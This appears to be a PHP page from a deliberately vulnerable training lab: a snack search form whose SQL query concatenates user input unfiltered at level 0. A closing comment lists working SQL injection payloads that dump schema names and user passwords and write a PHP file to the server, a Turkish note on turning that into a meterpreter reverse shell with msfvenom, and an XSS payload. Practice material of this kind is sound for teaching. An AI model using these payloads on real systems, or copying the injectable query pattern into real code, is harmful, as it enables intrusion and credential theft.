<?php

include_once "includer.php";
$newconn = new ConnectDB($sn,$un,$pss,$db);

function checkInput($data)
{
    switch($_COOKIE['security_level'])
    {
        case "0" :        
            $data = no_check($data);            
            break;
        case "1" :
            $data = xss_check_3($data);
            break;
        case "2" :                 
            $data = xss_check_3($data);            
            break;
        default : 
            $data = no_check($data);            
            break;   
    }       
    return $data;
}

?>


<div class="container">
    <h1>SQL Injection Get(Search Something)</h1>

    <form action="<?php echo $_SERVER['SCRIPT_NAME']; ?>" method="GET">

        <p>

            <label for="snackName">Search for a snack: </label>
            <input type="" id="snackName" name="snackName" value="Gofret">
            <button type="submit" name="action" value="search">Search</button>

        </p>

    </form>


    <table>

        <tr height="30" bgcolor="green" align="center">
            <td width="200"><b>Brand</b></td>
            <td width="200"><b>Name</b></td>
            <td width="200"><b>Calorie</b></td>
        </tr>

<?php

if(isset($_GET['snackName'])){
    $snack = $_GET['snackName'];
    $sql = "SELECT * FROM aburcubur WHERE aa_name LIKE '%".checkInput($snack)."%' ";
    #$sql = "SELECT * FROM aburcubur";
    #echo $sql;
    $result = $newconn->conn->query($sql);

    if(!$result){ 
	    #echo "DATA YOK";
?>
            <tr height="50">
                <td colspan="5" width="580">
                    <?php die("Error: " . print_r($newconn->conn->errorInfo())); ?>
                </td>
            </tr>
<?php
    }

    #echo "DATA VAR";
    if($result->rowCount() != 0){
        #echo "DATA GELIYOR";
        foreach( new RecursiveArrayIterator($result->fetchAll()) as $row){
?>
            <tr height="30">
                <td align="center">
                    <?php echo $row["aa_brand"]; ?>
                </td>
                <td align="center">
                    <?php echo $row["aa_name"]; ?>
                </td>
                <td align="center">
                    <?php echo $row["aa_calorie"]; ?>
                </td>
            </tr>
<?php
        }
    }
    else{
?>
    <tr height="30">
        <td colspan="5" width="580">No snacks were found!</td>
    </tr>
<?php
    }
    $newconn->disconnectServer();
}
else{
?>
    <tr height="30">
        <td colspan="5" width="580"></td>
    </tr>
<?php
}
#echo "BITTI";
?>
    </table>

</div>



<?php
/*

Level 0:
' union select 1,2,3,4#
' union select 1,version(),3,4#
' union select 1,database(),3,4#

' union select 1,2,table_name,4 from information_schema.tables where table_schema='test_db'#

' union select 1,2,column_name,4 from information_schema.columns where table_name='users'#

' union select 1,name,surname,password from users#

' union select '<?php echo "okan";','','','?>' into outfile '/Users/okanalan/www/proje/okan.php' #

artık karşıya dosya yükleyebiliyoruz msfvenom ile reverse_tcp payload oluşturup karşıya sonra da aç.
tadaaaaa karşıdan meterpreter aldın.


'union select 1,"<script>alert(1)</script>",3,4 #


Level 1:


*/
?>